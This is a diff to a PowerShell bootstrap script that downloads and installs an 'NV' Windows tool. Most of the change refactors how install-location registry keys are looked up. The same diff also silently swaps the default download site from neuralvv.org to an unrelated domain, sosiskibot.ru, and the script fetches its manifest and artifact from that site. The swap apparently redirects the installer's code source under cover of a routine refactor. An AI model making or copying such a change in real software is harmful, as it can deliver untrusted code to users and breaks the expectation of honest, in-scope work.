@@ -1,5 +1,5 @@
 $ErrorActionPreference = 'Stop'
-$siteBase = if ($env:NV_SITE_BASE) { $env:NV_SITE_BASE.TrimEnd('/') } else { 'https://neuralvv.org' }
+$siteBase = if ($env:NV_SITE_BASE) { $env:NV_SITE_BASE.TrimEnd('/') } else { 'https://sosiskibot.ru' }
 $apiBase = if ($env:NV_BOOTSTRAP_BASE) { $env:NV_BOOTSTRAP_BASE.TrimEnd('/') } else { "$siteBase/nv/api" }
 $manifest = Invoke-RestMethod "$apiBase/bootstrap/manifest?platform=nv-windows"
 $artifact = $manifest.artifacts | Where-Object { $_.platform -eq 'nv-windows' } | Select-Object -First 1
@@ -9,15 +9,24 @@ if ($downloadUrl.StartsWith('/')) {
     $downloadUrl = "$siteBase$downloadUrl"
 }
 $defaultInstallRoot = Join-Path $env:LOCALAPPDATA 'NV'
-$registryKey = 'HKCU:\Software\NV\Packages\lvls-nv-nv-windows'
+$registryKeys = @(
+    'HKCU:\Software\NV\Packages\nv-nv-windows',
+    'HKCU:\Software\NV\Packages\lvls-nv-nv-windows'
+)
 $existingCommand = Get-Command nv.exe -ErrorAction SilentlyContinue | Select-Object -First 1
 $installRoot = $null
 if ($env:NV_INSTALL_ROOT) {
     $installRoot = $env:NV_INSTALL_ROOT.Trim()
-} elseif (Test-Path $registryKey) {
-    $registryInstallRoot = (Get-ItemProperty -Path $registryKey -Name InstallRoot -ErrorAction SilentlyContinue).InstallRoot
-    if (-not [string]::IsNullOrWhiteSpace($registryInstallRoot)) {
-        $installRoot = $registryInstallRoot.Trim()
+} else {
+    foreach ($registryKey in $registryKeys) {
+        if (-not (Test-Path $registryKey)) {
+            continue
+        }
+        $registryInstallRoot = (Get-ItemProperty -Path $registryKey -Name InstallRoot -ErrorAction SilentlyContinue).InstallRoot
+        if (-not [string]::IsNullOrWhiteSpace($registryInstallRoot)) {
+            $installRoot = $registryInstallRoot.Trim()
+            break
+        }
     }
 }
 if (-not $installRoot -and $existingCommand -and $existingCommand.Source) {
